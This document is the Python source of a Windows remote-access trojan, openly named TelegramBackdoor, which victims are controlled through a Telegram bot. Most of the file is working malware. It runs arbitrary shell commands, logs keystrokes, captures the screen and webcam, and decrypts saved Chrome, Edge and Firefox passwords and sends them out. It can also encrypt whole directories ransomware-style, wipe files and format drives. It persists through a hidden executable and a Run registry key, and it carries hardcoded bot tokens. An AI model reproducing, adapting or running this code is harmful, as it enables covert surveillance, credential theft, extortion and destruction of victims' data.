from telegram import Update,Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
import os
import subprocess
import shutil
from pynput.keyboard import Key, Listener
from threading import Timer, Thread
import mss
from Crypto.Cipher import AES
from Crypto.Util import Counter
import glob
import datetime
import cv2
import numpy as np
import ctypes
import pyautogui
from io import BytesIO
import asyncio
import time
import socket
from threading import Thread
from Crypto.Protocol.KDF import PBKDF2  
from Crypto.Hash import SHA256 
import win32crypt 
import sqlite3
import json
import base64
import sys

data=""
class TelegramBackdoor:
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.application = Application.builder().token(self.bot_token).build()
        self.init_handlers()
    
    def init_handlers(self):
        # تعريف الأوامر
        self.application.add_handler(CommandHandler("cd", self.change_directory))
        self.application.add_handler(CommandHandler("download_all", self.download_all_files))
        self.application.add_handler(CommandHandler("download", self.download_file))
        self.application.add_handler(CommandHandler("ls", self.list_files))
        self.application.add_handler(CommandHandler("pwd", self.get_current_directory))
        self.application.add_handler(CommandHandler("keylogger", self.start_keylogger))
        self.application.add_handler(CommandHandler("screenshot", self.capture_image))
        self.application.add_handler(CommandHandler("photo", self.capture_camera))
        self.application.add_handler(CommandHandler("screenshare", self.screen_share))
        self.application.add_handler(CommandHandler("screenshareCa", self.screen_share_camera))
        self.application.add_handler(CommandHandler("getUser", self.get_user))
        self.application.add_handler(CommandHandler("change_back", self.change_wallpaper))
        self.application.add_handler(CommandHandler("encrypt_all", self.encrypt_all_files))
        self.application.add_handler(CommandHandler("encrypt", self.encrypt_file))
        self.application.add_handler(CommandHandler("decrypt_all", self.decrypt_all_files))
        self.application.add_handler(CommandHandler("decrypt", self.decrypt_file))
        self.application.add_handler(CommandHandler("format", self.format_hard))
        self.application.add_handler(CommandHandler("password", self.password_account))
        self.application.add_handler(CommandHandler("exit", self.exit))
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.run_command))
        self.application.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
        self.application.add_handler(MessageHandler(filters.PHOTO, self.handle_photo))
        self.application.add_handler(MessageHandler(filters.VIDEO, self.handle_video))
        self.application.run_polling()
        
    async def handle_document(self, update: Update, context: CallbackContext):
        """استقبال الملفات وحفظها على الجهاز."""
        try:
            document = update.message.document
            file = await context.bot.get_file(document.file_id)
            save_path = os.path.join(os.getcwd(), document.file_name)
            await file.download_to_drive(save_path)
        except Exception as e:
            await update.message.reply_text(f"حدث خطأ أثناء حفظ الملف: {str(e)}")

    async def password_account(self, update: Update, context: CallbackContext):
        try:
            await update.message.reply_text(f"جاري استخراج الحسابات لكل المتصفحات ......")
            chunk_size = 4000
            result=password_accounts()
            chunks = [result[i:i + chunk_size] for i in range(0, len(result), chunk_size)]
            for chunk in chunks:
                await update.message.reply_text(f"Password account :\n{chunk}")
        except Exception as e:
            await update.message.reply_text(f"حدث خطأ أثناء استخراج كلمات المرور: {str(e)}")

    async def handle_photo(self, update: Update, context: CallbackContext):
        """استقبال الصور وحفظها على الجهاز."""
        try:
            # الصور تأتي كقائمة (list) من الصور بجودات مختلفة
            photo = update.message.photo[-1]  # نأخذ الصورة بأعلى جودة
            file = await context.bot.get_file(photo.file_id)
            file_name = update.message.caption if update.message.caption else f"photo_{photo.file_id}.jpg"
            save_path = os.path.join(os.getcwd(),file_name)
            await file.download_to_drive(save_path)
            
            if os.path.exists(save_path):
                await update.message.reply_text(f"تم حفظ الصورة: {save_path}")
            else:
                await update.message.reply_text("فشل في حفظ الصورة.")
        except Exception as e:
            await update.message.reply_text(f"حدث خطأ أثناء حفظ الصورة: {str(e)}")

    async def handle_video(self, update: Update, context: CallbackContext):
        """استقبال الفيديوهات وحفظها على الجهاز."""
        try:
            video = update.message.video
            file = await context.bot.get_file(video.file_id)
            file_name = update.message.caption if update.message.caption else f"video_{video.file_id}.mp4"
            save_path = os.path.join(os.getcwd(),file_name)
            await file.download_to_drive(save_path)
            
            if os.path.exists(save_path):
                await update.message.reply_text(f"تم حفظ الفيديو: {save_path}")
            else:
                await update.message.reply_text("فشل في حفظ الفيديو.")
        except Exception as e:
            await update.message.reply_text(f"حدث خطأ أثناء حفظ الفيديو: {str(e)}")

    async def run_command(self, update: Update, context: CallbackContext):
        command = update.message.text
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            chunk_size = 4000  # أقل من 4096 لتجنب مشاكل الترميز
            chunks = [result[i:i + chunk_size] for i in range(0, len(result), chunk_size)]
            for chunk in chunks:
                await update.message.reply_text(f"Command output:\n{chunk}")
        
        except subprocess.CalledProcessError as e:
            await update.message.reply_text(f"Command failed with error:\n{e.output}")
        
        except Exception as ex:
            await update.message.reply_text(f"Error: {str(ex)}")

    async def send_message(self, update: Update, message: str):
        await update.message.reply_text(message)

    async def send_file(self, update: Update, file_path: str):
        with open(file_path, "rb") as f:
            await update.message.reply_document(document=f)

    async def change_directory(self, update: Update, context: CallbackContext):
        path = ' '.join(context.args)
        try:
            os.chdir(path)
            await self.send_message(update, f"Changed directory to {os.getcwd()}")
        except Exception as e:
            await self.send_message(update, f"Error: {str(e)}")

    async def download_all_files(self, update: Update, context: CallbackContext):
        path = ' '.join(context.args)
        files = glob.glob(path)
        for file in files:
            try:
                await self.send_file(update, file)
            except Exception as e:
                await self.send_message(update, f"Error downloading {file}: {str(e)}")
        await self.send_message(update, "Been all Download")

    async def download_file(self, update: Update, context: CallbackContext):
        file = ' '.join(context.args)
        try:
            await self.send_file(update, file)
        except Exception as e:
            await self.send_message(update, f"Error downloading {file}: {str(e)}")

    async def list_files(self, update: Update, context: CallbackContext):
        try:
            files = "\n".join(os.listdir())
            await self.send_message(update, f"Files in current directory:\n{files}")
        except Exception as e:
            await self.send_message(update, f"Error: {str(e)}")

    async def get_current_directory(self, update: Update, context: CallbackContext):
        await self.send_message(update, f"Current directory: {os.getcwd()}")

    async def start_keylogger(self, update: Update, context: CallbackContext):
        duration = int(context.args[0])
        await self.recorde_keyboard(update, duration)

    async def recorde_keyboard(self, update: Update, duration: int):
        def on_press(key):
            global text
            try:
                text += str(key.char)
            except AttributeError:
                if key == Key.space:
                    text += " "
                elif key == Key.enter:
                    text += "\n"
                elif key == Key.backspace:
                    text = text[:-1]
                else:
                    text += f" [{str(key)}] "

        def stop_listener():
            global text
            asyncio.run(self.send_message(update, text))
            text = ""
            listener.stop()

        t = Timer(duration, stop_listener)
        t.start()

        with Listener(on_press=on_press) as listener:
            listener.join()

    async def capture_image(self, update: Update, context: CallbackContext):
        with mss.mss() as sct:
            screenshot = sct.shot(output="screenshot.png")
            await self.send_file(update, screenshot)
            os.remove(screenshot)
    
    async def capture_camera(self, update: Update, context: CallbackContext):
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await update.message.reply_text("Error: Could not open camera.")
            return
        ret, frame = cap.read()
        if not ret:
            await update.message.reply_text("Error: Could not capture image.")
            return
        cap.release()
        image_path = "camera_capture.png"
        cv2.imwrite(image_path, frame)
        with open(image_path, "rb") as image_file:
            await update.message.reply_photo(photo=BytesIO(image_file.read()))
        os.remove(image_path)

    async def screen_share(self, update: Update, context: CallbackContext):
        try:
            duration = int(context.args[0]) 
        except (IndexError, ValueError):
            await update.message.reply_text("Usage: /screenshare <duration_in_seconds>")
            return
        output_file = "screen_recording.mp4"
        frame_rate = 10 
        resolution = (1920, 1080)  
        fourcc = cv2.VideoWriter_fourcc(*"mp4v") 
        out = cv2.VideoWriter(output_file, fourcc, frame_rate, resolution)
        start_time = asyncio.get_event_loop().time() 
        await update.message.reply_text(f"Recording screen for {duration} seconds...")
        while (asyncio.get_event_loop().time() - start_time) < duration:
            try:
                screenshot = pyautogui.screenshot()
                frame = np.array(screenshot)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR) 
                out.write(frame)
                await asyncio.sleep(1 / frame_rate)
            except Exception as e:
                await update.message.reply_text(f"Error: {str(e)}")
                break

        out.release()
        with open(output_file, "rb") as video_file:
            await update.message.reply_video(video=BytesIO(video_file.read()))
        os.remove(output_file)

    async def screen_share_camera(self, update: Update, context: CallbackContext):
        try:
            duration = int(context.args[0]) 
        except (IndexError, ValueError):
            await update.message.reply_text("Usage: /screenshare_camera <duration_in_seconds>")
            return
        
        output_file = "camera_recording.mp4"
        frame_rate = 30 
        resolution = (1280, 720)  
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")  
        out = cv2.VideoWriter(output_file, fourcc, frame_rate, resolution)
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await update.message.reply_text("Error: Could not open camera.")
            return

        await update.message.reply_text(f"Recording camera for {duration} seconds...")

        start_time = asyncio.get_event_loop().time()  # وقت بدء التسجيل

        while (asyncio.get_event_loop().time() - start_time) < duration:
            try:
                ret, frame = cap.read()
                if not ret:
                    break
                frame = cv2.resize(frame, resolution)
                out.write(frame)
                await asyncio.sleep(1 / frame_rate)
            except Exception as e:
                await update.message.reply_text(f"Error: {str(e)}")
                break
        cap.release()
        out.release()
        with open(output_file, "rb") as video_file:
            await update.message.reply_video(video=BytesIO(video_file.read()))
        os.remove(output_file)

    async def get_user(self, update: Update, context: CallbackContext):
        user = os.environ['USERPROFILE']
        os.chdir(user)
        await self.send_message(update, f"Current user: {user}")

    async def change_wallpaper(self, update: Update, context: CallbackContext):
        file =context.args[0]
        path_img=os.path.join(os.getcwd(),file)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path_img, 3)
        await self.send_message(update, "Wallpaper changed")

    async def encrypt_all_files(self, update: Update, context: CallbackContext):
        key = context.args[0]
        path = os.getcwd()
        await self.encrypt_all(update, key, path)

    async def encrypt_file(self, update: Update, context: CallbackContext):
        key = context.args[0]
        file = context.args[1]
        await self.encryption(update, key, file)

    async def decrypt_all_files(self, update: Update, context: CallbackContext):
        key = context.args[0]
        path = os.getcwd()
        await self.decrypt_all(update, key, path)

    async def decrypt_file(self, update: Update, context: CallbackContext):
        key = context.args[0]
        file = context.args[1]
        await self.decryption(update, key, file)

    async def format_hard(self, update: Update, context: CallbackContext):
        path = ' '.join(context.args)
        await self.format_hard_drive(update, path)

    async def exit(self, update: Update, context: CallbackContext):
        await self.send_message(update, "Exiting...")
        self.application.stop()

    async def encryption(self, update: Update, key, path):
        try:
            block_size = AES.block_size
            padding=lambda k:k+(16-len(k)%16)*"*"
            key=padding(key).encode('ascii')
            count = Counter.new(128)
            cipher = AES.new(key, AES.MODE_CTR, counter=count)
            with open(path, "r+b") as f:
                plaintext = f.read(block_size)
                while plaintext:
                    f.seek(-len(plaintext), 1)
                    f.write(cipher.encrypt(plaintext))
                    plaintext = f.read(block_size)
            os.rename(path, path + ".enc")
            filename=path.split('\\')
            await self.send_message(update, f"File encrypted {filename[len(filename)-1]}")
        except Exception as er:
            await self.send_message(update, "not file pleas try agin")

    async def encrypt_all(self, update: Update, key, path):
        try:
           for root, dirs, files in os.walk(path):
               for file in files:
                   try:
                       file_path = os.path.join(root, file)
                       await self.encryption(update, key, file_path)
                   except Exception as e:
                       pass
           await self.send_message(update, "pleas try agin")
        except Exception as er:
            await self.send_message(update, "not file pleas try agin")

    async def decryption(self, update: Update, key, path):
        try:
           count = Counter.new(128)
           padding=lambda k:k+(16-len(k)%16)*"*"
           key=padding(key).encode('ascii')
           cipher = AES.new(key, AES.MODE_CTR, counter=count)
           with open(path, "r+b") as f:
               plaintext = f.read(AES.block_size)
               while plaintext:
                   f.seek(-len(plaintext), 1)
                   f.write(cipher.decrypt(plaintext))
                   plaintext = f.read(AES.block_size)
           os.rename(path, path.rstrip(".enc"))
           filename=path.split('\\')
           await self.send_message(update, f"File decrypted {filename[len(filename)-1]}")
        except Exception as er:
            await self.send_message(update, "not file pleas try agin")

    async def decrypt_all(self, update: Update, key, path):
        try:
           for root, dirs, files in os.walk(path):
               for file in files:
                   try:
                       file_path = os.path.join(root, file)
                       await self.decryption(update, key, file_path)
                   except Exception as e:
                       pass
           await self.send_message(update, "pleas try agin")

        except Exception as er:
            await self.send_message(update, "not file pleas try agin")

    async def format_hard_drive(self, update: Update, path):
        def delete_files_and_dirs():
            for root, dirs, files in os.walk(path, topdown=False):
                for file in files:
                    try:
                        os.remove(os.path.join(root, file))
                    except Exception as e:
                        pass
                for dir in dirs:
                    try:
                        os.rmdir(os.path.join(root, dir))
                    except Exception as e:
                        pass

        def format_drive():
            try:
                subprocess.run(f'format {path} /q /fs:NTFS', shell=True, check=True)
            except Exception as e:
                pass

        delete_files_and_dirs()
        format_drive()
        await self.send_message(update, "Drive formatted")

def is_connected():
    """التحقق من اتصال الإنترنت."""
    try:
        socket.create_connection(("www.google.com", 80), timeout=5)
        return True
    except OSError:
        return False


def password_accounts():
       def get_chrome_edge_passwords(browser_name):
           global data
           # تحديد المسارات بناءً على اسم المتصفح
           if browser_name.lower() == "chrome":
               local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State')
               login_data_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
           elif browser_name.lower() == "edge":
               local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Local State')
               login_data_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
           else:
               data+=f"المتصفح غير مدعوم: {browser_name}\n\n"
               return
       
           # التحقق من وجود الملفات
           if not os.path.exists(local_state_path):
               return
           if not os.path.exists(login_data_path):
               return
       
           # نسخ ملف Login Data إلى موقع مؤقت
           temp_db_path = os.path.join(os.getenv('TEMP'), 'temp_login_data.db')
           try:
               with open(login_data_path, 'rb') as original_file:
                   with open(temp_db_path, 'wb') as temp_file:
                       temp_file.write(original_file.read())
           except Exception as e:
               return
       
           # استخراج مفتاح التشفير الرئيسي من Local State
           try:
               with open(local_state_path, 'r', encoding='utf-8') as f:
                   local_state = json.loads(f.read())
               encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
               encrypted_key = encrypted_key[5:]  # إزالة البادئة 'DPAPI'
               decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
           except Exception as e:
               return
       
           # الاتصال بقاعدة البيانات المؤقتة
           try:
               conn = sqlite3.connect(temp_db_path)
               cursor = conn.cursor()
               cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
               rows = cursor.fetchall()
           except Exception as e:
               return
       
           # فك تشفير كلمات المرور
           if not rows:
               data+=f"\n\nNo password in browser {browser_name}.\n\n"
           else:
               data+=f"\n\nPassword in browser {browser_name}:\n"
               for row in rows:
                   url = row[0]
                   username = row[1]
                   encrypted_password = row[2]
       
                   if not encrypted_password:
                       continue
       
                   try:
                       if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
                           # فك تشفير باستخدام AES-256-GCM
                           nonce = encrypted_password[3:15]
                           ciphertext = encrypted_password[15:-16]
                           tag = encrypted_password[-16:]
                           cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce)
                           decrypted_password = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
                       else:
                           # فك تشفير باستخدام DPAPI (للإصدارات القديمة)
                           decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
                   except Exception as e:
                       decrypted_password = f"فك التشفير فشل: {e}"
       
                   data+=f"URL: {url}\n"
                   data+=f"Username: {username}\n"
                   data+=f"Password: {decrypted_password}\n"
                   data+="-" * 50+"\n"
           cursor.close()
           conn.close()
           os.remove(temp_db_path)
       
       def get_firefox_passwords():
           global data
           data+="\n\nPassword Firefox:\n"
           firefox_profile_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
           logins_path, key_path = None, None
           for root, dirs, files in os.walk(firefox_profile_path):
               if 'logins.json' in files and 'key4.db' in files:
                   logins_path = os.path.join(root, 'logins.json')
                   key_path = os.path.join(root, 'key4.db')
                   break
       
           if not logins_path or not key_path:
               return
           try:
               conn = sqlite3.connect(key_path)
               cursor = conn.cursor()
               cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'password';")
               row = cursor.fetchone()
               if not row:
                   return
               global_salt, item2 = row
               cursor.execute("SELECT a11, a102 FROM nssPrivate;")
               row = cursor.fetchone()
               if not row:
                   return
               a11, a102 = row
               conn.close()
       
               # فك تشفير المفتاح الرئيسي
               key = PBKDF2(global_salt, a102, 32, count=1, hmac_hash_module=SHA256)
               cipher = AES.new(key, AES.MODE_CBC, a11[:16])
               decrypted_key = cipher.decrypt(a11[16:])[:32]
           except Exception as e:
               return
       
           # فك تشفير كلمات المرور
           def decrypt_firefox_password(encrypted_value, key):
               try:
                   iv = encrypted_value[:16]
                   ciphertext = encrypted_value[16:]
                   cipher = AES.new(key, AES.MODE_CBC, iv)
                   decrypted = cipher.decrypt(ciphertext)
                   return decrypted[:-decrypted[-1]].decode('utf-8')
               except Exception as e:
                   return 
       
           # قراءة ملف logins.json
           try:
               with open(logins_path, 'r', encoding='utf-8') as f:
                   logins_data = json.loads(f.read())
           except Exception as e:
               return
           for login in logins_data['logins']:
               url = login['hostname']
               username = login['encryptedUsername']
               password = login['encryptedPassword']
       
               decrypted_username = decrypt_firefox_password(base64.b64decode(username), decrypted_key)
               decrypted_password = decrypt_firefox_password(base64.b64decode(password), decrypted_key)
       
               data+=f"URL: {url}\n"
               data+=f"Username: {decrypted_username}\n"
               data+=f"Password: {decrypted_password}\n"
               data+="-" * 50+"\n"
       
       if __name__ == "__main__":
               get_chrome_edge_passwords("chrome")
               get_chrome_edge_passwords("edge")
               get_firefox_passwords()
               return data
    
def send_responce_bot():
    while True:
         try:
            bot_token = '8112064545:AAEMf4FgOsCQk6VLWY8FcMFSZhYoVEBdbjM'
            chat_id = '7840869740'
            bot=Bot(token=bot_token)
            async def send_message():
                username="Username:\n"+subprocess.check_output("whoami",shell=True,stderr=subprocess.STDOUT,universal_newlines=True)
                system="Operting System:\n"+subprocess.check_output("wmic os get name,version",shell=True,stderr=subprocess.STDOUT,universal_newlines=True)
                system=system.rsplit('\n')
                now=datetime.datetime.now()
                send_time="Sending time:\n"+now.strftime("%Y-%m-%d %I:%M:%S %p")
                systems_info=""
                for info in system:
                    if info!='':
                        systems_info+=info+"\n"
                result="Information System :\n"+username+"\n"+systems_info+"\n"+send_time
                await bot.send_message(chat_id=chat_id,text=str(result))
            asyncio.run(send_message())
            time.sleep(3*60)
         except Exception as er:
             time.sleep(3*60)
             pass


def main():
    chat_id = '7840869740'
    bot_token = '7737056381:AAFX5qWZR8OXs032tvRrLffbVX-9bPFuEqM'
    
    while True:
       try:
            if is_connected():
               try:
                  backdoor=TelegramBackdoor(bot_token,chat_id)
                  backdoor.application.run_polling()
               except Exception as er:
                   pass
               time.sleep(3*60)
            else:
                time.sleep(3*60)
       except Exception as er:
           print("error")
           pass

def get_persistens():
    program = os.environ["appdata"] + "\\Secure System.exe"
    if not os.path.exists(program):
        shutil.copyfile(sys.executable, program)
        command = [
            "reg", "add",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v", "Secure",
            "/t", "REG_SZ",
            "/d", program,
            "/f"
        ]
        subprocess.run(command, creationflags=subprocess.CREATE_NO_WINDOW)
        command2= ["attrib","+h",program]
        subprocess.run(command2, creationflags=subprocess.CREATE_NO_WINDOW)

get_persistens()

if __name__ == "__main__":
    handle=Thread(target=send_responce_bot,args=())
    handle.start()
    main()
